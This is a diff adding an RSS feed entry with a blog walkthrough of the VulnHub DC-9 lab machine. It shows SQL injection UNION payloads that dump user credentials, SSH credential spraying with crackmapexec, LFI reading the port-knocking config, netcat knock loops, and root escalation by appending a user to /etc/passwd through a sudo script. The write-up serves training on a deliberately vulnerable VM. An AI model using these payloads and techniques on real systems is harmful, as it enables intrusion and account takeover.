@@ -8,6 +8,337 @@
     <lastBuildDate>Wed, 02 Jun 2021 01:18:59 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/port-knocking/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>VulnHub - DC-9</title>
+      <link>https://fahmifj.github.io/vulnhub/dc9/</link>
+      <pubDate>Wed, 02 Jun 2021 01:18:59 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/vulnhub/dc9/</guid>
+      <description>DC-9 from VulnHub features a website that is vulnerable to SQL injection. I’m able to dump a bunch of users’ credentials by exploiting the SQLi and gain a foothold a on the system after spraying these credentials on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.
+Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full nmap scan broke that rule.</description>
+      <content:encoded><![CDATA[<p>DC-9 from VulnHub features a website that is vulnerable to SQL injection. I’m able to dump a bunch of users’ credentials by exploiting the SQLi and gain a foothold a on the system after spraying these credentials on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.</p>
+<p>Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full <code>nmap</code> scan broke that rule. Even though I gained a foothold by skipping the LFI and port knocking, I&rsquo;ll still include the intended way (LFI and port knocking) in the foothold section.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Blind SQL injection</li>
+<li>Local file Inclusion</li>
+<li>Port knocking</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>Arpscan</li>
+<li>CrackMapExec</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="host-discovery---arp-scan">Host Discovery - arp-scan</h3>
+<p><code>192.168.2.102</code> is the target.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ arp-scan --interface eth0 192.168.2.0/24 <span class="p">|</span> tee scans/00-arp-scan
+Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103
+Starting arp-scan 1.9.7 with <span class="m">256</span> hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+192.168.2.2     0a:00:27:00:00:0a       <span class="o">(</span>Unknown: locally administered<span class="o">)</span>
+192.168.2.1     08:00:27:d9:63:87       PCS Systemtechnik GmbH
+192.168.2.102   08:00:27:54:bc:fd       PCS Systemtechnik GmbH
+
+<span class="m">3</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
+Ending arp-scan 1.9.7: <span class="m">256</span> hosts scanned in 1.986 seconds <span class="o">(</span>128.90 hosts/sec<span class="o">)</span>. <span class="m">3</span> responded
+</code></pre></div><h3 id="port-scan---nmap">Port Scan - nmap</h3>
+<p><code>nmap</code> shows two ports available, 80 (HTTP) and 22 (SSH). SSH port is in filtered state.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ nmap -n -sC -sV -oA scans/10-initial-dc9 <span class="s1">&#39;192.168.2.102&#39;</span> -v
+<span class="c1"># Nmap 7.80 scan initiated Thu Apr  8 02:43:51 2021 as: nmap -n -sC -sV -oA scans/10-initial-dc9 -v 192.168.2.102</span>
+Nmap scan report <span class="k">for</span> 192.168.2.102
+Host is up <span class="o">(</span>0.00048s latency<span class="o">)</span>.
+Not shown: <span class="m">998</span> closed ports
+PORT   STATE    SERVICE VERSION
+22/tcp filtered ssh
+80/tcp open     http    Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
+<span class="p">|</span> http-methods: 
+<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+<span class="p">|</span>_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
+<span class="p">|</span>_http-title: Example.com - Staff Details - Welcome
+MAC Address: 08:00:27:54:BC:FD <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+</code></pre></div><p>But, later it turns into open state after a full port scan performed.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ nmap -n -p22 192.168.2.102
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-08 05:21 EDT
+Nmap scan report <span class="k">for</span> 192.168.2.102
+Host is up <span class="o">(</span>0.00075s latency<span class="o">)</span>.
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+MAC Address: 08:00:27:54:BC:FD <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+</code></pre></div><p>I can confirms it with <code>netcat</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ nc 192.168.2.102 <span class="m">22</span>
+SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>The home page of this site doesn&rsquo;t provide anything useful.</p>
+<p><div class="img-container"><img src="imgs/image-20210408134805695.png" alt="image-20210408134805695"  /></div>
+</p>
+<p>The Display All Records menu functions to display all user records.</p>
+<p><div class="img-container"><img src="imgs/image-20210408134819215.png" alt="image-20210408134819215"  /></div>
+</p>
+<p>There is a user input on the Search menu</p>
+<p><div class="img-container"><img src="imgs/image-20210408134833069.png" alt="image-20210408134833069"  /></div>
+</p>
+<p>The Manage menu has login function.</p>
+<p><div class="img-container"><img src="imgs/image-20210408134853665.png" alt="image-20210408134853665"  /></div>
+</p>
+<p>From here I can assume that the website uses database.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="sql-injection">SQL injection</h3>
+<h4 id="identify">Identify</h4>
+<p>There&rsquo;s error-based SQL injection on <code>search.php</code>, and the initial detection is simple, <em>when I try put <code>'</code> it gives bug</em> (joke <a href="https://twitter.com/LiveOverflow/status/1313157161007054854">reference</a>).</p>
+<p>In this web, the SQLi vulnerability can be identified by adding a single quote  ('`) at the end of users' first name that I want to search.</p>
+<p><div class="img-container"><img src="imgs/image-20210602031408130.png" alt="image-20210602031408130"  /></div>
+</p>
+<p>Based on the search page, you can only input one name (either the first or the last name) and it will return a single record, so without <code>'</code>, the search should return one related result.</p>
+<p><div class="img-container"><img src="imgs/image-20210602031344011.png" alt="image-20210602031344011"  /></div>
+</p>
+<p>But then, when I submit <code>' OR 1=1 -- -'</code>, it returns all the records.</p>
+<p><div class="img-container"><img src="imgs/image-20210602030509083.png" alt="image-20210602030509083"  /></div>
+</p>
+<h4 id="union-injection">UNION injection</h4>
+<p>To perform the SQL union injection attack manually, I&rsquo;ll have to identify the available columns and its data type.</p>
+<p>There are 6 columns with the data type of each column is string. The injection query is as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">a</span><span class="s1">&#39;,&#39;</span><span class="n">b</span><span class="s1">&#39;,&#39;</span><span class="k">c</span><span class="s1">&#39;,&#39;</span><span class="n">d</span><span class="s1">&#39;,&#39;</span><span class="n">e</span><span class="s1">&#39;,&#39;</span><span class="n">f</span><span class="s1">&#39; -- 
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602033329668.png" alt="image-20210602033329668"  /></div>
+</p>
+<p>I’ll pull out database version, current database, and the available databases.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39; UNION SELECT @@version, &#39;</span><span class="k">Current</span><span class="w"> </span><span class="n">DB</span><span class="p">:</span><span class="s1">&#39;, database(), group_concat(SCHEMA_NAME),5,6 FROM information_schema.schemata -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602033848222.png" alt="image-20210602033848222"  /></div>
+</p>
+<p>The website uses MariaDB as its database. The database currently in use is <code>Staff</code>. <code>Staff</code> and <code>users</code> are non-default database, so I&rsquo;ll look into their tables.</p>
+<p>With the following query, I can get the two tables name from database <code>Staff</code>: <code>StaffDetails</code> and <code>Users</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39;UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables where table_schema = &#39;</span><span class="n">Staff</span><span class="s1">&#39; -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602034617576.png" alt="image-20210602034617576"  /></div>
+</p>
+<p><code>StaffDetails</code> contains the all the staff records which previously seen at the Display All Records menu.</p>
+<p>I’ll get the columns name of the table <code>Users</code> with the following query:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39;UNION SELECT group_concat(column_name), 2,3,4,5,6 from information_schema.columns where table_name = &#39;</span><span class="n">Users</span><span class="s1">&#39; -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602035249528.png" alt="image-20210602035249528"  /></div>
+</p>
+<p>I will get the contents of the Username and the Password columns, and it returns a set of credentials.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39; UNION SELECT group_concat(username, &#39;</span><span class="p">:</span><span class="s1">&#39;, password),2,3,4,5,6 FROM Users -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602040550090.png" alt="image-20210602040550090"  /></div>
+</p>
+<p>The password is in md5 format.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ <span class="nb">echo</span> 856f5de590ef37314e7c3bdf6f8a66dc <span class="p">|</span> wc -c
+<span class="m">33</span>
+</code></pre></div><p>The hash can be cracked online. The credentials is <code>admin:transorbital1</code>, and I’ll just keep that for now.</p>
+<p><div class="img-container"><img src="imgs/image-20210602044447046.png" alt="image-20210602044447046"  /></div>
+</p>
+<p>On database <code>users</code>,  there is only one table called <code>UserDetails</code>. Here is the query.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39;UNION SELECT group_concat(table_name),2,3,4,5,6 FROM information_schema.tables where table_schema = &#39;</span><span class="n">users</span><span class="s1">&#39; -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041638341.png" alt="image-20210602041638341"  /></div>
+</p>
+<p>With the following query, I can get the columns on table <code>UserDetails</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39; UNION SELECT group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name = &#39;</span><span class="n">UserDetails</span><span class="s1">&#39; -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041745247.png" alt="image-20210602041745247"  /></div>
+</p>
+<p><code>UserDetails</code> has 6 columns, but I&rsquo;m interested only with the <code>username</code> and the <code>password</code> column, and I&rsquo;ll pull out the their contents.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="s1">&#39; UNION SELECT group_concat(username,&#34;:&#34;,password),2,3,4,5,6 FROM users.UserDetails -- -
+</span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041822329.png" alt="image-20210602041822329"  /></div>
+</p>
+<p>That&rsquo;s a lot of credentials. I can sort these creds with <code>sed</code> command by substituting comma with new line.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ <span class="nb">echo</span> -n <span class="s1">&#39;marym:3kfs86sfd,julied:468sfdfsd2,fredf:4sfd87sfd1,barneyr:RocksOff,tomc:TC&amp;TheBoyz,jerrym:B8m#48sd,wilmaf:Pebbles,bettyr:BamBam01,chandlerb:UrAG0D!,joeyt:Passw0rd,rachelg:yN72#dsd,rossg:ILoveRachel,monicag:3248dsds7s,phoebeb:smellycats,scoots:YR3BVxxxw87,janitor:Ilovepeepee,janitor2:Hawaii-Five-0&#39;</span> <span class="p">|</span> sed -s <span class="s1">&#39;s/,/\n/g&#39;</span>
+marym:3kfs86sfd
+julied:468sfdfsd2
+fredf:4sfd87sfd1
+barneyr:RocksOff
+tomc:TC<span class="p">&amp;</span>TheBoyz
+jerrym:B8m#48sd
+wilmaf:Pebbles
+bettyr:BamBam01
+chandlerb:UrAG0D!
+joeyt:Passw0rd
+rachelg:yN72#dsd
+rossg:ILoveRachel
+monicag:3248dsds7s
+phoebeb:smellycats
+scoots:YR3BVxxxw87
+janitor:Ilovepeepee
+janitor2:Hawaii-Five-0
+</code></pre></div><h3 id="shell-access">Shell access</h3>
+<h4 id="ssh-login-brute-force">SSH Login brute-force</h4>
+<p>Since the SSH port is open, I tried all the credentials I obtained from SQLi on SSH using <code>crackmapexec</code>. It returned 3 valid logins.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success
+SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
+...&lt;SNIP&gt;...
+SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>+<span class="o">]</span> chandlerb:UrAG0D! 
+SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>+<span class="o">]</span> joeyt:Passw0rd 
+...&lt;SNIP&gt;...
+SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>+<span class="o">]</span> janitor:Ilovepeepee 
+...&lt;SNIP&gt;...
+</code></pre></div><h4 id="intended-lfi-and-port-knocking">(Intended) LFI and Port Knocking</h4>
+<p>In my case, I discovered that the website is vulnerable to LFI after inspecting the source code.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">chandlerb@dc-9:/var/www/html$ cat manage.php
+&lt;?php
+<span class="nv">$file</span> <span class="o">=</span> <span class="s1">&#39;contact-info.php&#39;</span><span class="p">;</span>
+<span class="nv">$show_errors</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;display_errors&#39;</span><span class="o">]</span><span class="p">;</span>
+    <span class="k">if</span> <span class="o">(</span><span class="nv">$show_errors</span> <span class="o">==</span> <span class="s1">&#39;yes&#39;</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">if</span><span class="o">(</span>file_exists<span class="o">(</span><span class="nv">$file</span><span class="o">))</span> <span class="o">{</span>
+            include<span class="o">(</span><span class="nv">$file</span><span class="o">)</span><span class="p">;</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="nb">echo</span> <span class="s2">&#34;File does not exist&#34;</span> . <span class="s2">&#34;&lt;br /&gt;&#34;</span><span class="p">;</span>
+            <span class="c1"># LFI vulnerability starts from here</span>
+            <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">]</span><span class="p">;</span> 
+            <span class="c1"># No input sanitization poc: manage?file=../../../../etc/passwd</span>
+            include<span class="o">(</span><span class="s1">&#39;directory/&#39;</span> . <span class="nv">$file</span><span class="o">)</span><span class="p">;</span> 
+        <span class="o">}</span>
+...&lt;SNIP&gt;...
+</code></pre></div><p>Using LFI is the intended way to gain a foothold before performing brute force. In order to exploit it, I previously had to login using the credentials I obtained through SQLi (<code>admin:transorbital1</code>).</p>
+<p>With LFI can include  <code>/etc/knockd.conf</code> to read the knocking sequence to open the SSH port.</p>
+<p><div class="img-container"><img src="imgs/image-20210602050027114.png" alt="image-20210602050027114"  /></div>
+</p>
+<p>In case the SSH port is closed, then to open it, I&rsquo;ll need to interact with port 7469,8475,9842 sequentially.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="k">for</span> i in <span class="m">7469</span> <span class="m">8475</span> 9842<span class="p">;</span> <span class="k">do</span> nc -w1 192.168.2.102 <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span>
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210602051747909.png" alt="image-20210602051747909"  /></div>
+</p>
+<p>To close the port, I&rsquo;ll need to knock in reverse order:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="k">for</span> i in <span class="m">9842</span> <span class="m">8475</span> 7469<span class="p">;</span> <span class="k">do</span> nc -w1 192.168.2.102 <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span>
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210602052201358.png" alt="image-20210602052201358"  /></div>
+</p>
+<p>Then, from here, I should use SSH brute force (which I did earlier).</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-fredf">Shell as fredf</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>Only user janitor that has one valuable thing in its home dir, and that is a password list.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
+BamBam01
+Passw0rd
+smellycats
+P0Lic#10-4
+B4-Tru3-001
+4uGU5T-NiGHts
+</code></pre></div><p>With those new password, I&rsquo;ll perform another brute force using <code>crackmapexec</code>.</p>
+<h4 id="ssh---fredf">SSH - fredf</h4>
+<p><code>crackmapexec</code> returns one valid login for <code>fred:B4-Tru3-001</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success
+SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
+...
+SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>+<span class="o">]</span> fredf:B4-Tru3-001 
+...
+</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «dc-9» «192.168.2.103»
+$ ssh fredf@192.168.2.102
+fredf@192.168.2.102<span class="err">&#39;</span>s password:
+Linux dc-9 4.19.0-6-amd64 <span class="c1">#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64</span>
+
+The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+the exact distribution terms <span class="k">for</span> each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Apr  <span class="m">8</span> 20:10:42 <span class="m">2021</span> from 192.168.2.103
+fredf@dc-9:~$ id
+<span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>fredf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>fredf<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>fredf<span class="o">)</span>
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-2">Enumeration</h4>
+<p>User fredf has sudo privileges on a custom binary called <code>test</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">fredf@dc-9:/home$ sudo -l
+Matching Defaults entries <span class="k">for</span> fredf on dc-9:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+
+User fredf may run the following commands on dc-9:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /opt/devstuff/dist/test/test
+</code></pre></div><p>I suspect <code>/opt/devstuff/test.py</code> is the actual code of that binary.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">fredf@dc-9:/opt/devstuff$ cat test.py 
+<span class="c1">#!/usr/bin/python</span>
+
+import sys
+
+<span class="k">if</span> len <span class="o">(</span>sys.argv<span class="o">)</span> !<span class="o">=</span> <span class="m">3</span> :
+    print <span class="o">(</span><span class="s2">&#34;Usage: python test.py read append&#34;</span><span class="o">)</span>
+    sys.exit <span class="o">(</span>1<span class="o">)</span>
+
+<span class="k">else</span> :
+    <span class="nv">f</span> <span class="o">=</span> open<span class="o">(</span>sys.argv<span class="o">[</span>1<span class="o">]</span>, <span class="s2">&#34;r&#34;</span><span class="o">)</span>
+    <span class="nv">output</span> <span class="o">=</span> <span class="o">(</span>f.read<span class="o">())</span>
+
+    <span class="nv">f</span> <span class="o">=</span> open<span class="o">(</span>sys.argv<span class="o">[</span>2<span class="o">]</span>, <span class="s2">&#34;a&#34;</span><span class="o">)</span>
+    f.write<span class="o">(</span>output<span class="o">)</span>
+    f.close<span class="o">()</span>
+</code></pre></div><h4 id="script-analysis">Script Analysis</h4>
+<p>It checks if the arguments are equal to 3. If it doesn&rsquo;t have 3 arguments, it exits.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span> <span class="p">:</span>
+    <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;Usage: python test.py read append&#34;</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div><p>Otherwise, it reads a file specified on argv1 in read mode and store its contents to the variable <code>output</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">else</span> <span class="p">:</span>
+    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span>
+    <span class="n">output</span> <span class="o">=</span> <span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</code></pre></div><p>Then it opens a file specified on argv2 in append mode and it adds the variable <code>output</code>  (the file contents of argv1) to that file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div><p>Since this gives arbitrary write on the system, it can be exploited in many ways, one of which is to add a new root account to <code>/etc/passwd</code>.</p>
+<h4 id="exploitation">Exploitation</h4>
+<p>First, I&rsquo;ll create a password hash using <code>openssl</code> command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">fredf@dc-9:/tmp$ openssl passwd -1 -salt iamf pass123
+<span class="nv">$1$iamf$lq0NuDAhNy8IFlaFgiRw20</span>
+</code></pre></div><p>I&rsquo;ll follow the flat database format of <code>/etc/passwd</code> to create my own user. I&rsquo;ll use the field property of root user, and substitute the password (<code>x</code> field) and the username with the one I specified.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># From this</span>
+root:x:0:0:root:/root:/bin/bash
+<span class="c1"># To</span>
+iamf:<span class="nv">$1$iamf$lq0NuDAhNy8IFlaFgiRw20</span>:0:0:root:/root:/bin/bash
+</code></pre></div><p>I&rsquo;ll store that to a file called <code>/tmp/passwd</code>.</p>
+<p>And now I can just append the content of <code>/tmp/passwd</code> to <code>/etc/passwd</code> using <code>/opt/devstuff/dist/test/test</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">fredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test /tmp/passwd /etc/passwd
+</code></pre></div><p>I can confirms my account is there (<code>/etc/passwd</code>).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">fredf@dc-9:/tmp$ cat /etc/passwd
+...
+janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash
+janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash
+iamf:<span class="nv">$1$iamf$lq0NuDAhNy8IFlaFgiRw20</span>:0:0:root:/root:/bin/bash
+</code></pre></div><h4 id="su---root">SU - root</h4>
+<p>Now I can switch to my account and get a root shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">fredf@dc-9:/tmp$ su iamf
+Password: pass123
+root@dc-9:/tmp#
+</code></pre></div><p>And here is the flag,</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@dc-9:~# cat theflag.txt 
+
+
+███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
+████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
+██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
+██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
+██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
+╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
+                                                                             
+Congratulations - you have <span class="k">done</span> well to get to this point.
+
+Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
+who have taken the <span class="nb">time</span> to <span class="nb">complete</span> the various DC challenges.
+
+I also want to send out a big thank you to the various members of @m0tl3ycr3w .
+
+They are an inspirational bunch of fellows.
+
+Sure, they might smell a bit, but...just kidding.  :-<span class="o">)</span>
+
+Sadly, all things must come to an end, and this will be the last ever
+challenge in the DC series.
+
+So long, and thanks <span class="k">for</span> all the fish.
+</code></pre></div><hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a></li>
+<li><a href="https://crackstation.net/">https://crackstation.net/</a></li>
+<li><a href="https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/">https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>VulnHub - DC-9</title>
       <link>https://fahmifj.github.io/writeups/vulnhub/vh-dc9/</link>
       <pubDate>Wed, 02 Jun 2021 01:18:59 +0700</pubDate>
       
